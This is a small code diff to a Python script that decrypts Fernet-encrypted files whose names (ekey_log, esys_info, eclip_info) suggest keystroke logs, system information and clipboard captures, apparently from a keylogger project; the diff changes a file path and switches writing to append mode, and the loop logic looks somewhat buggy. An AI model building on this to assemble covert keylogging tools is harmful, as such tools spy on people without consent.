@@ -10,13 +10,13 @@ encrypted = [ekey_log, esys_info, eclip_info]
 fileCount = 0
 
 for decrypted in encrypted:
-    with open(decrypted[fileCount], 'rb') as file:
+    with open(encrypted[fileCount], 'rb') as file:
         data = file.read()
 
     fernet = Fernet(key)
     decrypted = fernet.decrypt(data)
 
-    with open(encrypted[fileCount], 'wb') as file:
+    with open(encrypted[fileCount], 'ab') as file:
         file.write(decrypted)
 
     fileCount += 1
